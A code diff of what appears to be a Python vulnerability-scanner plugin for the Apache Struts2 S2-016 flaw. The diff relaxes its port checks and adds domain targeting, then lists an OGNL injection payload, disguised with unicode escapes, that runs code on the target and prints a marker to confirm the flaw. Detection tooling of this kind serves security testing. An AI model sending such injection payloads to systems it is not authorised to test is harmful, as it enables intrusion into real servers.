@@ -8,7 +8,10 @@ from config import is_port_open, is_http
 
 def get_url(domain, timeout):
     url_list = []
-    res = urllib2.urlopen('http://' + domain, timeout=timeout)
+    try:
+        res = urllib2.urlopen('http://' + domain, timeout=timeout)
+    except Exception as e:
+        return []
     html = res.read()
     root_url = res.geturl()
     m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
@@ -23,11 +26,15 @@ def get_url(domain, timeout):
     return list(set(url_list))
 
 
-@is_port_open
-def verify(ip, port=80, name=None, timeout=10):
-    if is_http(ip, int(port)) is False:
-        return
-    url_list = get_url(ip + ":" + str(port), timeout)
+# @is_port_open
+def verify(ip, port=80, name=None, timeout=10, types='ip'):
+    # if is_http(ip, int(port)) is False:
+    #     return
+    if types == 'ip':
+        domain = ip + ':' + str(port)
+    else:
+        domain = ip
+    url_list = get_url(domain, timeout)
     flag_list = {
         "S2_016": {"poc": [
             "redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}"],
